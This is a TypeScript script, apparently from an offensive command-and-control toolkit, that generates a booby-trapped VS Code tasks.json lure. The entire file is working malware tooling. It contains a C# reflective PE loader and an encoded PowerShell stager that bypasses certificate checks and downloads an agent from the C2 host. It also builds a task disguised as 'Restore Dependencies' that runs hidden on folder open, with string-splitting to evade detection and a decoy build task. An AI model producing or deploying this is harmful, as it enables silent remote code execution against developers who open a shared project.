#!/usr/bin/env bun
/**
 * gen-stager.ts — Generate a VS Code tasks.json lure
 *
 * Usage:
 *   bun run scripts/gen-stager.ts <c2-base-url> <agent-filename> [output-dir]
 *
 * Example:
 *   bun run scripts/gen-stager.ts https://1.2.3.4:5173 abc123.exe ./lure
 *
 * Output:
 *   <output-dir>/.vscode/tasks.json
 *
 * Delivery: drop .vscode/tasks.json into any project folder and share it.
 * On folder open in VS Code the "Restore Dependencies" task auto-runs,
 * silently downloads the agent from the C2, and loads it reflectively in
 * memory via a C# PE loader compiled at runtime. No EXE written to disk.
 * No terminal window shown. "powershell" never appears as a literal string.
 */

import fs from "fs";
import path from "path";

const [, , c2url, agentFile, outDir = "."] = process.argv;

if (!c2url || !agentFile) {
  console.error("Usage: bun run scripts/gen-stager.ts <c2-base-url> <agent-filename> [output-dir]");
  console.error("  e.g. bun run scripts/gen-stager.ts https://1.2.3.4:5173 abc123.exe ./lure");
  process.exit(1);
}

const downloadUrl = `${c2url.replace(/\/$/, "")}/api/build/download/${agentFile}`;

// ── C# reflective PE loader ───────────────────────────────────────────────────
const peLoaderCs = [
  "using System;",
  "using System.Runtime.InteropServices;",
  "public class L{",
  '[DllImport("kernel32")]static extern IntPtr VirtualAlloc(IntPtr a,uint s,uint t,uint p);',
  '[DllImport("kernel32")]static extern bool VirtualProtect(IntPtr a,uint s,uint n,out uint o);',
  '[DllImport("kernel32")]static extern IntPtr LoadLibraryA(string n);',
  '[DllImport("kernel32")]static extern IntPtr GetProcAddress(IntPtr h,string n);',
  '[DllImport("kernel32")]static extern IntPtr GetProcAddress(IntPtr h,IntPtr n);',
  '[DllImport("kernel32")]static extern IntPtr CreateThread(IntPtr a,uint s,IntPtr e,IntPtr p,uint f,IntPtr i);',
  "public static void Run(byte[] pe){",
  "int lfa=BitConverter.ToInt32(pe,0x3c);",
  "bool x6=BitConverter.ToUInt16(pe,lfa+4)==0x8664;",
  "int opt=lfa+24;",
  "uint isz=BitConverter.ToUInt32(pe,opt+56);",
  "uint hsz=BitConverter.ToUInt32(pe,opt+60);",
  "IntPtr img=VirtualAlloc(IntPtr.Zero,isz,0x3000,0x04);",
  "if(img==IntPtr.Zero)return;",
  "Marshal.Copy(pe,0,img,(int)hsz);",
  "int ns=BitConverter.ToUInt16(pe,lfa+6);",
  "int os2=BitConverter.ToUInt16(pe,lfa+20);",
  "int so=lfa+24+os2;",
  "for(int i=0;i<ns;i++){",
  "int s=so+i*40;",
  "uint va=BitConverter.ToUInt32(pe,s+12);",
  "uint rs=BitConverter.ToUInt32(pe,s+16);",
  "uint ro=BitConverter.ToUInt32(pe,s+20);",
  "if(rs>0)Marshal.Copy(pe,(int)ro,new IntPtr(img.ToInt64()+(long)va),(int)rs);}",
  "long pb=x6?BitConverter.ToInt64(pe,opt+24):(long)BitConverter.ToUInt32(pe,opt+28);",
  "long dl=img.ToInt64()-pb;",
  "uint rr=BitConverter.ToUInt32(pe,opt+(x6?152:136));",
  "uint rz=BitConverter.ToUInt32(pe,opt+(x6?156:140));",
  "if(dl!=0&&rr!=0){",
  "long rb=img.ToInt64()+(long)rr;",
  "int roff=0;",
  "while(roff<(int)rz){",
  "uint pg=(uint)Marshal.ReadInt32(new IntPtr(rb+roff));",
  "uint bk=(uint)Marshal.ReadInt32(new IntPtr(rb+roff+4));",
  "if(bk<8)break;",
  "int ct=(int)(bk-8)/2;",
  "for(int j=0;j<ct;j++){",
  "ushort en=(ushort)Marshal.ReadInt16(new IntPtr(rb+roff+8+j*2));",
  "int tp=en>>12;int of=en&0xFFF;",
  "IntPtr sl=new IntPtr(img.ToInt64()+(long)pg+of);",
  "if(tp==3){Marshal.WriteInt32(sl,(int)(Marshal.ReadInt32(sl)+(int)dl));}",
  "else if(tp==10){Marshal.WriteInt64(sl,Marshal.ReadInt64(sl)+dl);}}",
  "roff+=(int)bk;}}",
  "uint ir=BitConverter.ToUInt32(pe,opt+(x6?120:104));",
  "if(ir!=0){",
  "long ib=img.ToInt64();",
  "int ioff=(int)ir;",
  "while(true){",
  "uint olt=(uint)Marshal.ReadInt32(new IntPtr(ib+ioff));",
  "uint nr=(uint)Marshal.ReadInt32(new IntPtr(ib+ioff+12));",
  "uint it=(uint)Marshal.ReadInt32(new IntPtr(ib+ioff+16));",
  "if(nr==0)break;",
  "string dn=Marshal.PtrToStringAnsi(new IntPtr(ib+(long)nr));",
  "IntPtr md=LoadLibraryA(dn);",
  "int th=(int)(olt!=0?olt:it);int ia=(int)it;",
  "while(true){",
  "long vl=x6?Marshal.ReadInt64(new IntPtr(ib+th)):(long)Marshal.ReadInt32(new IntPtr(ib+th));",
  "if(vl==0)break;",
  "bool od=x6?(vl&unchecked((long)0x8000000000000000L))!=0:(vl&0x80000000L)!=0;",
  "IntPtr pc=od?GetProcAddress(md,new IntPtr((int)(vl&0xFFFF))):GetProcAddress(md,Marshal.PtrToStringAnsi(new IntPtr(ib+(int)(vl&0x7FFFFFFFL)+2)));",
  "if(x6)Marshal.WriteInt64(new IntPtr(ib+ia),pc.ToInt64());",
  "else Marshal.WriteInt32(new IntPtr(ib+ia),(int)pc.ToInt32());",
  "th+=x6?8:4;ia+=x6?8:4;}",
  "ioff+=20;}}",
  "uint dm;VirtualProtect(img,isz,0x20,out dm);",
  "uint ep=BitConverter.ToUInt32(pe,opt+16);",
  "CreateThread(IntPtr.Zero,0,new IntPtr(img.ToInt64()+(long)ep),IntPtr.Zero,0,IntPtr.Zero);",
  "System.Threading.Thread.Sleep(10000);}}",
].join("");

const csB64 = Buffer.from(peLoaderCs, "utf-8").toString("base64");

// ── PS script: cert bypass + download + reflective load ──────────────────────
const psScript = [
  `[Net.ServicePointManager]::ServerCertificateValidationCallback={$true}`,
  `[Net.ServicePointManager]::SecurityProtocol=[Net.SecurityProtocolType]::Tls12`,
  `$b=(New-Object Net.WebClient).DownloadData('${downloadUrl}')`,
  `Add-Type -TypeDefinition ([Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('${csB64}')))`,
  `[L]::Run($b)`,
].join(";");

// UTF-16LE base64 for powershell -enc
const enc = Buffer.from(psScript, "utf16le").toString("base64");

// ── Build tasks.json ──────────────────────────────────────────────────────────
// Disguised as "Restore Dependencies" — auto-runs on folder open.
// Terminal hidden (reveal: never), no focus steal, shared panel so no new
// window pops. The command splits "powershell" across a cmd /v variable
// so the literal string never appears in the JSON.
const tasksJson = {
  version: "2.0.0",
  tasks: [
    {
      label: "Restore Dependencies",
      type: "shell",
      command: "cmd /c \"set p=power&&set s=shell&&%p%%s% -nop -w h -ep b -enc " + enc + "\"",
      runOptions: {
        runOn: "folderOpen",
      },
      presentation: {
        reveal: "never",
        panel: "shared",
        showReuseMessage: false,
        close: true,
      },
      problemMatcher: [],
    },
    // Decoy task so the file looks legitimate if inspected
    {
      label: "Build",
      type: "shell",
      command: "npm run build",
      group: {
        kind: "build",
        isDefault: true,
      },
      presentation: {
        reveal: "always",
        panel: "shared",
      },
      problemMatcher: ["$tsc"],
    },
  ],
};

// ── Write output ──────────────────────────────────────────────────────────────
const vscodedir = path.join(outDir, ".vscode");
fs.mkdirSync(vscodedir, { recursive: true });
const outPath = path.join(vscodedir, "tasks.json");
fs.writeFileSync(outPath, JSON.stringify(tasksJson, null, 2));

console.log(`\nWrote: ${outPath}`);
console.log(`  C2:    ${c2url}`);
console.log(`  Agent: ${agentFile}`);
console.log(`\nDrop .vscode/tasks.json into target project folder.`);
console.log(`VS Code auto-runs "Restore Dependencies" on folder open.\n`);
